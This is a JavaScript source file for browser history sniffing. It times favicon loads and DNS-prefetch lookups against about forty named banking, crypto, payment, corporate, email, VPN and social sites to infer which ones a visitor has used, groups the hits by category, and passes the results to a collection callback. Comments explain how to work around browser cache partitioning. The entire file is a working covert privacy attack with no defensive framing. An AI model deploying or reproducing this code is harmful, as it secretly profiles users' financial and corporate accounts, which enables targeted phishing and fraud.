// ── History sniffing via cache timing + DNS prefetch timing ───────────────────
// Technique: load known resources WITHOUT cache-busting.
// Cached (visited) resources load in ~1-10ms.
// Fresh network fetches take 50-500ms.
// DNS prefetch timing probes DNS cache (not partitioned like HTTP cache).
// Note: Chrome 86+ HTTP cache partitioning reduces favicon timing accuracy,
// but DNS timing and navigation timing side-channels remain effective.

var TARGETS = {
  // Banking
  'chase.com':          {favicon:'https://www.chase.com/favicon.ico',cat:'Banking'},
  'bankofamerica.com':  {favicon:'https://www.bankofamerica.com/favicon.ico',cat:'Banking'},
  'wellsfargo.com':     {favicon:'https://www.wellsfargo.com/favicon.ico',cat:'Banking'},
  'citibank.com':       {favicon:'https://www.citibank.com/favicon.ico',cat:'Banking'},
  'capitalone.com':     {favicon:'https://www.capitalone.com/favicon.ico',cat:'Banking'},
  'barclays.co.uk':     {favicon:'https://www.barclays.co.uk/favicon.ico',cat:'Banking'},
  'hsbc.com':           {favicon:'https://www.hsbc.com/favicon.ico',cat:'Banking'},
  'deutschebank.com':   {favicon:'https://www.db.com/favicon.ico',cat:'Banking'},
  // Crypto
  'coinbase.com':       {favicon:'https://www.coinbase.com/favicon.ico',cat:'Crypto'},
  'binance.com':        {favicon:'https://www.binance.com/favicon.ico',cat:'Crypto'},
  'kraken.com':         {favicon:'https://www.kraken.com/favicon.ico',cat:'Crypto'},
  'crypto.com':         {favicon:'https://www.crypto.com/favicon.ico',cat:'Crypto'},
  'bybit.com':          {favicon:'https://www.bybit.com/favicon.ico',cat:'Crypto'},
  'okx.com':            {favicon:'https://www.okx.com/favicon.ico',cat:'Crypto'},
  'robinhood.com':      {favicon:'https://robinhood.com/favicon.ico',cat:'Finance'},
  // Finance / Payment
  'paypal.com':         {favicon:'https://www.paypal.com/favicon.ico',cat:'Payment'},
  'stripe.com':         {favicon:'https://stripe.com/favicon.ico',cat:'Payment'},
  'wise.com':           {favicon:'https://wise.com/favicon.ico',cat:'Payment'},
  'revolut.com':        {favicon:'https://www.revolut.com/favicon.ico',cat:'Payment'},
  // Corporate SaaS
  'slack.com':          {favicon:'https://slack.com/favicon.ico',cat:'Corporate'},
  'atlassian.com':      {favicon:'https://www.atlassian.com/favicon.ico',cat:'Corporate'},
  'jira.com':           {favicon:'https://jira.atlassian.com/favicon.ico',cat:'Corporate'},
  'confluence.com':     {favicon:'https://confluence.atlassian.com/favicon.ico',cat:'Corporate'},
  'github.com':         {favicon:'https://github.com/favicon.ico',cat:'Dev'},
  'gitlab.com':         {favicon:'https://gitlab.com/favicon.ico',cat:'Dev'},
  'notion.so':          {favicon:'https://www.notion.so/favicon.ico',cat:'Corporate'},
  'salesforce.com':     {favicon:'https://www.salesforce.com/favicon.ico',cat:'Corporate'},
  'workday.com':        {favicon:'https://www.workday.com/favicon.ico',cat:'Corporate'},
  'office.com':         {favicon:'https://www.office.com/favicon.ico',cat:'Microsoft'},
  'outlook.com':        {favicon:'https://outlook.live.com/favicon.ico',cat:'Microsoft'},
  'sharepoint.com':     {favicon:'https://www.sharepoint.com/favicon.ico',cat:'Microsoft'},
  // Email / Comms
  'mail.google.com':    {favicon:'https://mail.google.com/favicon.ico',cat:'Email'},
  'proton.me':          {favicon:'https://proton.me/favicon.ico',cat:'Email'},
  'tutanota.com':       {favicon:'https://tutanota.com/favicon.ico',cat:'Email'},
  // VPN / Privacy
  'nordvpn.com':        {favicon:'https://nordvpn.com/favicon.ico',cat:'VPN'},
  'expressvpn.com':     {favicon:'https://www.expressvpn.com/favicon.ico',cat:'VPN'},
  'protonvpn.com':      {favicon:'https://protonvpn.com/favicon.ico',cat:'VPN'},
  // Social
  'reddit.com':         {favicon:'https://www.reddit.com/favicon.ico',cat:'Social'},
  'twitter.com':        {favicon:'https://twitter.com/favicon.ico',cat:'Social'},
  'linkedin.com':       {favicon:'https://www.linkedin.com/favicon.ico',cat:'Social'},
};

// Threshold: below this ms = likely cached (visited)
// Conservative threshold — cache hits are typically <15ms, network >80ms
var CACHE_THRESHOLD = 30;
var DNS_THRESHOLD   = 25;

var results = {
  likely_visited: [],
  unlikely: [],
  timing: {},
  method_notes: [],
  cache_partitioned: null,
};

// ── Phase 1: HTTP cache timing via favicon load ───────────────────────────────
function probeFavicons(done) {
  var sites = Object.keys(TARGETS);
  var left  = sites.length;
  sites.forEach(function(site) {
    var info  = TARGETS[site];
    var img   = new Image();
    var start = performance.now();
    var fired = false;
    function fin() {
      if (fired) return; fired = true;
      var ms = Math.round(performance.now() - start);
      results.timing[site] = {ms: ms, cat: info.cat, method: 'favicon'};
      if (ms < CACHE_THRESHOLD) {
        if (results.likely_visited.indexOf(site) === -1)
          results.likely_visited.push(site);
      } else {
        results.unlikely.push(site);
      }
      if (!--left) done();
    }
    img.onload  = fin;
    img.onerror = fin;
    // No cache-busting — we WANT cache hits
    img.src = info.favicon;
    setTimeout(fin, 2000);
  });
}

// ── Phase 2: DNS prefetch timing (not HTTP-cache-partitioned) ─────────────────
// DNS cache is shared across origins — not affected by cache partitioning.
// Pre-resolve a domain then time re-resolution; cached DNS is faster.
function probeDNS(done) {
  var sites = Object.keys(TARGETS);
  var left  = sites.length;
  if (!window.PerformanceObserver) { done(); return; }

  var observed = {};
  try {
    var obs = new PerformanceObserver(function(list) {
      list.getEntries().forEach(function(e) {
        try {
          var host = new URL(e.name).hostname;
          if (!observed[host] && TARGETS[host]) {
            observed[host] = Math.round(e.domainLookupEnd - e.domainLookupStart);
          }
        } catch(x) {}
      });
    });
    obs.observe({type:'resource', buffered:true});
  } catch(e) { done(); return; }

  // Inject prefetch links
  var frag = document.createDocumentFragment();
  sites.forEach(function(site) {
    var l = document.createElement('link');
    l.rel  = 'dns-prefetch';
    l.href = '//' + site;
    frag.appendChild(l);
  });
  document.head.appendChild(frag);

  setTimeout(function() {
    sites.forEach(function(site) {
      var dns = observed[site];
      if (dns !== undefined) {
        results.timing[site] = results.timing[site] || {cat:TARGETS[site].cat};
        results.timing[site].dns_ms = dns;
        results.timing[site].method = (results.timing[site].method||'') + '+dns';
        if (dns < DNS_THRESHOLD && results.likely_visited.indexOf(site) === -1) {
          results.likely_visited.push(site);
          var idx = results.unlikely.indexOf(site);
          if (idx !== -1) results.unlikely.splice(idx, 1);
        }
      }
      if (!--left) done();
    });
  }, 1500);
}

// ── Detect if cache partitioning is active ────────────────────────────────────
// Load a known-always-cached Google resource, check if timing suggests isolation
function detectPartitioning(done) {
  var img   = new Image();
  var start = performance.now();
  img.onload = img.onerror = function() {
    var ms = Math.round(performance.now() - start);
    // If Google's favicon takes >50ms we're likely cache-partitioned
    results.cache_partitioned = ms > 50;
    results.method_notes.push(
      'Cache partitioning detected: ' + results.cache_partitioned +
      ' (Google favicon: ' + ms + 'ms)' +
      (results.cache_partitioned ? ' — favicon timing less reliable, DNS timing primary' : ' — favicon timing reliable')
    );
    done();
  };
  img.src = 'https://www.google.com/favicon.ico';
}

// ── Run all phases ────────────────────────────────────────────────────────────
detectPartitioning(function() {
  probeFavicons(function() {
    probeDNS(function() {
      // Group results by category
      var byCategory = {};
      results.likely_visited.forEach(function(site) {
        var cat = TARGETS[site] ? TARGETS[site].cat : 'Unknown';
        if (!byCategory[cat]) byCategory[cat] = [];
        byCategory[cat].push({site: site, timing: results.timing[site]});
      });
      results.by_category = byCategory;
      results.summary = results.likely_visited.length + ' sites likely visited | ' +
        'cache partitioned: ' + results.cache_partitioned;
      __pzResult(results);
    });
  });
});
return '__async__';